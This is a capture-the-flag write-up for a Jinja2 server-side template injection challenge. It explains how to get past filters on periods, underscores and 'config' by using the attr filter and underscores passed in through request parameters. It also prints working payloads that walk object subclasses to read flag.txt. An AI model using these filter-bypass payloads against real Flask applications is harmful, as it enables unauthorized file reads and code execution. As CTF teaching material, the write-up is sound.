# Silent_Blade

A Server-Side Template Injection (SSTI) challenge with restrictions embedded.

## Challenge Description

The goal of this challenge is to exploit a Server-Side Template Injection (SSTI) vulnerability in the website. But, it won't be straightforward because many filters are in place to make it more challenging.

## Solution

The website has an input field that is vulnerable to SSTI. Our goal is to execute arbitrary code to read the `flag.txt` file. However, there are filters that block:

- **Periods (`.`)**, prenting direct access to object attributes like `__class__`.
- **Underscores (`_`)**, which stops you from using "magic methods" like `__mro__` or `__subclasses__`.
- The word **"config"**, which is often used to access sensitive information in Flask/Jinja2.

- Since periods and underscores are filtered, we need to find an indirect way to access attributes. We can use Jinja2’s `attr` filter to access attributes using string names, which helps bypass the restrictions.

### Exploit Construction

1. **Using URL Parameters**:

   - we can use `request.args.underscore*2` to simulate `__` .
   - Build the exploit string to access restricted attributes like `__class__`, `__mro__`, and `__subclasses__` without using periods or underscores directly.

2. **Payload**:

if there weren't restrictions, the normal payload would have been like this:

```yaml
value={{''.__class__.__mro__[2].__subclasses__()[40] ('flag.txt').read() }}
```

but with the restrictions , here is the final payload:

```yaml
value={{ (('' | attr( [request.args.underscore*2, 'class'  ,request.args.underscore*2] | join) | attr( [request.args.underscore*2, 'mro'  ,request.args.underscore*2] | join  ) )[2] | attr([request.args.underscore*2, 'subclasses'  ,request.args.underscore*2] | join)())[40]  ('flag.txt').read() }}&underscore=_
```
